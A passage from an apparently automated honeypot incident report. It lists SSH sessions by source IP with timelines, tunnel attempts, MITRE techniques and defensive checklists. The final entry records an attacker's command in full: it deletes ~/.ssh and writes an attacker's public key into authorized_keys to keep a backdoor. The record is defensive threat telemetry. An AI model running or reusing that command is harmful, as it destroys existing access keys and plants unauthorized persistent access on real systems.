| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 06:55:57` | `cowrie.session.connect` |
| `2026-09-03 06:55:57` | `cowrie.client.version` |
| `2026-09-03 06:55:57` | `cowrie.client.kex` |
| `2026-09-03 06:55:58` | `cowrie.login.success` |
| `2026-09-03 06:55:58` | `cowrie.direct-tcpip.request` |
| `2026-09-03 06:55:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 06:55:58` | `cowrie.direct-tcpip.data` |
| `2026-09-03 06:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34826838f29c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:01 |
| **Last Seen** | 2026-09-03 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:01:19` | `cowrie.session.connect` |
| `2026-09-03 07:01:19` | `cowrie.client.version` |
| `2026-09-03 07:01:19` | `cowrie.client.kex` |
| `2026-09-03 07:01:20` | `cowrie.login.success` |
| `2026-09-03 07:01:20` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:01:20` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:01:20` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:01:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7685ebbdc88

| Field | Detail |
|---|---|
| **Source IP** | `34.62.24[.]95` |
| **First Seen** | 2026-09-03 07:02 |
| **Last Seen** | 2026-09-03 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:02:22` | `cowrie.session.connect` |
| `2026-09-03 07:02:22` | `cowrie.login.success` |
| `2026-09-03 07:02:23` | `cowrie.session.params` |
| `2026-09-03 07:02:23` | `cowrie.command.input` |
| `2026-09-03 07:02:23` | `cowrie.command.input` |
| `2026-09-03 07:02:23` | `cowrie.command.failed` |
| `2026-09-03 07:02:23` | `cowrie.command.input` |
| `2026-09-03 07:02:23` | `cowrie.log.closed` |
| `2026-09-03 07:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.24[.]95` to AbuseIPDB if not already reported
- [ ] Block `34.62.24[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-496916e129fb

| Field | Detail |
|---|---|
| **Source IP** | `34.62.24[.]95` |
| **First Seen** | 2026-09-03 07:02 |
| **Last Seen** | 2026-09-03 07:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:02:31` | `cowrie.session.connect` |
| `2026-09-03 07:02:31` | `cowrie.login.success` |
| `2026-09-03 07:02:31` | `cowrie.session.params` |
| `2026-09-03 07:02:31` | `cowrie.command.input` |
| `2026-09-03 07:02:31` | `cowrie.command.failed` |
| `2026-09-03 07:02:42` | `cowrie.log.closed` |
| `2026-09-03 07:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.24[.]95` to AbuseIPDB if not already reported
- [ ] Block `34.62.24[.]95` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16653b1c613c

| Field | Detail |
|---|---|
| **Source IP** | `34.62.24[.]95` |
| **First Seen** | 2026-09-03 07:02 |
| **Last Seen** | 2026-09-03 07:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:02:33` | `cowrie.session.connect` |
| `2026-09-03 07:02:33` | `cowrie.login.success` |
| `2026-09-03 07:02:33` | `cowrie.session.params` |
| `2026-09-03 07:02:33` | `cowrie.command.input` |
| `2026-09-03 07:02:42` | `cowrie.log.closed` |
| `2026-09-03 07:02:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.24[.]95` to AbuseIPDB if not already reported
- [ ] Block `34.62.24[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e4f93f73991

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:05 |
| **Last Seen** | 2026-09-03 07:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:05:29` | `cowrie.session.connect` |
| `2026-09-03 07:05:29` | `cowrie.client.version` |
| `2026-09-03 07:05:29` | `cowrie.client.kex` |
| `2026-09-03 07:05:30` | `cowrie.login.success` |
| `2026-09-03 07:05:30` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:05:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:05:30` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107b8b3db043

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:11 |
| **Last Seen** | 2026-09-03 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:11:52` | `cowrie.session.connect` |
| `2026-09-03 07:11:52` | `cowrie.client.version` |
| `2026-09-03 07:11:53` | `cowrie.client.kex` |
| `2026-09-03 07:11:53` | `cowrie.login.success` |
| `2026-09-03 07:11:54` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:11:54` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:11:54` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:11:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd1275618708

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:14 |
| **Last Seen** | 2026-09-03 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:14:54` | `cowrie.session.connect` |
| `2026-09-03 07:14:54` | `cowrie.client.version` |
| `2026-09-03 07:14:54` | `cowrie.client.kex` |
| `2026-09-03 07:14:55` | `cowrie.login.success` |
| `2026-09-03 07:14:55` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:14:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:14:55` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d062c41c08a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:22 |
| **Last Seen** | 2026-09-03 07:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:22:39` | `cowrie.session.connect` |
| `2026-09-03 07:22:39` | `cowrie.client.version` |
| `2026-09-03 07:22:39` | `cowrie.client.kex` |
| `2026-09-03 07:22:40` | `cowrie.login.success` |
| `2026-09-03 07:22:40` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:22:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:22:40` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c26c14170041

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:24 |
| **Last Seen** | 2026-09-03 07:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:24:23` | `cowrie.session.connect` |
| `2026-09-03 07:24:23` | `cowrie.client.version` |
| `2026-09-03 07:24:23` | `cowrie.client.kex` |
| `2026-09-03 07:24:24` | `cowrie.login.success` |
| `2026-09-03 07:24:24` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:24:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:24:24` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92a468fd76d1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:33 |
| **Last Seen** | 2026-09-03 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:33:25` | `cowrie.session.connect` |
| `2026-09-03 07:33:25` | `cowrie.client.version` |
| `2026-09-03 07:33:25` | `cowrie.client.kex` |
| `2026-09-03 07:33:26` | `cowrie.login.success` |
| `2026-09-03 07:33:26` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:33:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:33:26` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ea75a6b97eb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:33 |
| **Last Seen** | 2026-09-03 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:33:57` | `cowrie.session.connect` |
| `2026-09-03 07:33:57` | `cowrie.client.version` |
| `2026-09-03 07:33:57` | `cowrie.client.kex` |
| `2026-09-03 07:33:58` | `cowrie.login.success` |
| `2026-09-03 07:33:58` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:33:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:33:59` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d662f53afa8

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:43 |
| **Last Seen** | 2026-09-03 07:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:43:23` | `cowrie.session.connect` |
| `2026-09-03 07:43:23` | `cowrie.client.version` |
| `2026-09-03 07:43:23` | `cowrie.client.kex` |
| `2026-09-03 07:43:24` | `cowrie.login.success` |
| `2026-09-03 07:43:24` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:43:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:43:24` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:43:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d98d4a8b62

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:44 |
| **Last Seen** | 2026-09-03 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:44:02` | `cowrie.session.connect` |
| `2026-09-03 07:44:02` | `cowrie.client.version` |
| `2026-09-03 07:44:02` | `cowrie.client.kex` |
| `2026-09-03 07:44:03` | `cowrie.login.success` |
| `2026-09-03 07:44:03` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:44:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:44:03` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:44:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8bd309f2d43

| Field | Detail |
|---|---|
| **Source IP** | `35.205.247[.]108` |
| **First Seen** | 2026-09-03 07:44 |
| **Last Seen** | 2026-09-03 07:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:44:50` | `cowrie.session.connect` |
| `2026-09-03 07:44:50` | `cowrie.client.version` |
| `2026-09-03 07:44:50` | `cowrie.client.kex` |
| `2026-09-03 07:44:52` | `cowrie.login.success` |
| `2026-09-03 07:44:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.205.247[.]108` to AbuseIPDB if not already reported
- [ ] Block `35.205.247[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18d94da26989

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 07:48 |
| **Last Seen** | 2026-09-03 07:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:48:59` | `cowrie.session.connect` |
| `2026-09-03 07:48:59` | `cowrie.client.version` |
| `2026-09-03 07:48:59` | `cowrie.client.kex` |
| `2026-09-03 07:49:00` | `cowrie.login.success` |
| `2026-09-03 07:49:00` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:49:00` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aca451bfe6b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-03 07:51 |
| **Last Seen** | 2026-09-03 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:51:29` | `cowrie.session.connect` |
| `2026-09-03 07:51:29` | `cowrie.client.version` |
| `2026-09-03 07:51:29` | `cowrie.client.kex` |
| `2026-09-03 07:51:30` | `cowrie.login.success` |
| `2026-09-03 07:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b0e993c17a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-03 07:51 |
| **Last Seen** | 2026-09-03 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:51:29` | `cowrie.session.connect` |
| `2026-09-03 07:51:29` | `cowrie.client.version` |
| `2026-09-03 07:51:29` | `cowrie.client.kex` |
| `2026-09-03 07:51:30` | `cowrie.login.success` |
| `2026-09-03 07:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-daf5a54de993

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:52 |
| **Last Seen** | 2026-09-03 07:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:52:59` | `cowrie.session.connect` |
| `2026-09-03 07:52:59` | `cowrie.client.version` |
| `2026-09-03 07:52:59` | `cowrie.client.kex` |
| `2026-09-03 07:53:00` | `cowrie.login.success` |
| `2026-09-03 07:53:00` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:53:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:53:00` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e6f68f731b0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 07:54 |
| **Last Seen** | 2026-09-03 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:54:52` | `cowrie.session.connect` |
| `2026-09-03 07:54:52` | `cowrie.client.version` |
| `2026-09-03 07:54:52` | `cowrie.client.kex` |
| `2026-09-03 07:54:53` | `cowrie.login.success` |
| `2026-09-03 07:54:53` | `cowrie.direct-tcpip.request` |
| `2026-09-03 07:54:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 07:54:53` | `cowrie.direct-tcpip.data` |
| `2026-09-03 07:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3334b327b5b6

| Field | Detail |
|---|---|
| **Source IP** | `207.175.153[.]57` |
| **First Seen** | 2026-09-03 07:55 |
| **Last Seen** | 2026-09-03 07:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:55:10` | `cowrie.session.connect` |
| `2026-09-03 07:55:10` | `cowrie.login.success` |
| `2026-09-03 07:55:10` | `cowrie.session.params` |
| `2026-09-03 07:55:10` | `cowrie.command.input` |
| `2026-09-03 07:55:10` | `cowrie.command.input` |
| `2026-09-03 07:55:10` | `cowrie.command.failed` |
| `2026-09-03 07:55:10` | `cowrie.command.input` |
| `2026-09-03 07:55:10` | `cowrie.log.closed` |
| `2026-09-03 07:55:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.153[.]57` to AbuseIPDB if not already reported
- [ ] Block `207.175.153[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee7d18d143d3

| Field | Detail |
|---|---|
| **Source IP** | `207.175.153[.]57` |
| **First Seen** | 2026-09-03 07:55 |
| **Last Seen** | 2026-09-03 07:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:55:23` | `cowrie.session.connect` |
| `2026-09-03 07:55:23` | `cowrie.login.success` |
| `2026-09-03 07:55:24` | `cowrie.session.params` |
| `2026-09-03 07:55:24` | `cowrie.command.input` |
| `2026-09-03 07:55:24` | `cowrie.command.failed` |
| `2026-09-03 07:55:31` | `cowrie.log.closed` |
| `2026-09-03 07:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.153[.]57` to AbuseIPDB if not already reported
- [ ] Block `207.175.153[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32a7eba555d4

| Field | Detail |
|---|---|
| **Source IP** | `207.175.153[.]57` |
| **First Seen** | 2026-09-03 07:55 |
| **Last Seen** | 2026-09-03 07:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:55:25` | `cowrie.session.connect` |
| `2026-09-03 07:55:25` | `cowrie.login.success` |
| `2026-09-03 07:55:26` | `cowrie.session.params` |
| `2026-09-03 07:55:26` | `cowrie.command.input` |
| `2026-09-03 07:55:31` | `cowrie.log.closed` |
| `2026-09-03 07:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.153[.]57` to AbuseIPDB if not already reported
- [ ] Block `207.175.153[.]57` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a4f1d5f8f1e

| Field | Detail |
|---|---|
| **Source IP** | `31.56.146[.]239` |
| **First Seen** | 2026-09-03 07:58 |
| **Last Seen** | 2026-09-03 07:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 07:58:41` | `cowrie.session.connect` |
| `2026-09-03 07:58:41` | `cowrie.client.version` |
| `2026-09-03 07:58:41` | `cowrie.client.kex` |
| `2026-09-03 07:58:42` | `cowrie.login.success` |
| `2026-09-03 07:58:43` | `cowrie.session.params` |
| `2026-09-03 07:58:43` | `cowrie.command.input` |
| `2026-09-03 07:58:43` | `cowrie.command.failed` |
| `2026-09-03 07:58:44` | `cowrie.log.closed` |
| `2026-09-03 07:58:45` | `cowrie.session.params` |
| `2026-09-03 07:58:45` | `cowrie.command.input` |
| `2026-09-03 07:58:45` | `cowrie.session.file_download` |
| `2026-09-03 07:58:45` | `cowrie.log.closed` |
| `2026-09-03 07:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.146[.]239` to AbuseIPDB if not already reported
